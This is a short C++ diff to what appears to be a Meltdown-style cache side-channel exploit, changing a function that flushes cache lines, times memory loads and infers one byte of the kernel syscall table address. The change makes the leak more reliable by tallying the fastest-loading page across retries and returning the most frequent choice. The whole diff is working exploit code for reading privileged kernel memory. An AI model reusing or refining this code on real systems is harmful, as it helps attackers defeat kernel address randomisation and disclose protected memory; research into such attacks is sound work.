@@ -73,10 +73,11 @@ static inline unsigned mem_size() {
 //
 static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, char* pages) {
     std::array<unsigned long, total_pages> durations;
-    uint8_t index = 0;
+    std::array<unsigned long, total_pages> index_heat;
+    index_heat.fill(0);
 
     for (auto r = 0; r < syscall_table_entry_read_retries; r++) {
-        durations = { 0 };
+        durations.fill(0);
 
         for (auto i = 0; i < total_pages; i++) {
             __clflush(&pages[i * page_size()]);
@@ -94,13 +95,16 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
         }
 
         static_assert(total_pages <= std::numeric_limits<uint8_t>::max()+1, "total_pages will overflow index");
+        uint8_t index = 0;
         for (auto i = 0; i < total_pages; i++) {
             durations[i] = __measure_load_execution(&pages[i * page_size()]);
 
             index = (durations[index] <= durations[i]) ? index : i;
         }
+        index_heat[index]++;
     }
-    return index;
+    // Returns the index which was more frequently chosen.
+    return std::distance(index_heat.begin(), std::max_element(index_heat.begin(), index_heat.end()));
 }
 
 //
